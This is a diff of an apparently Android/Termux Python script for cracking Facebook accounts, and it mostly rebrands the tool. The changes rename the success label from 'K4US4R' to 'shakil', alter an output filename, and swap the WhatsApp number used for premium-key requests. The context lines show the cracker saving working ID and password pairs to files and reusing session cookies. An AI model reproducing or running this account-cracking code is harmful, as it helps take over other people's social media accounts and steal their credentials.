@@ -372,7 +372,7 @@ def free(idf,pwv):
 				print(f'\r\x1b[1;92m [ K4US4R-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/K4US4R-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/K4US 4R-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -1281,7 +1281,7 @@ class Main:
 				open("2009-SዙAӃꀤŁ-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ K4US4R-OK ] %s | %s\033[0;92m         "%(uid, pw))
+				print("\r \033[0;92m[ shakil-OK ] %s | %s\033[0;92m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-SዙAӃꀤŁ-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -1321,6 +1321,6 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
-		os.system('am start https://wa.me/+8801612278337?text=' + tks)
+		os.system('am start https://wa.me/+8801750633432?text=' + tks)
 		Subscraption()        
 Subscraption()
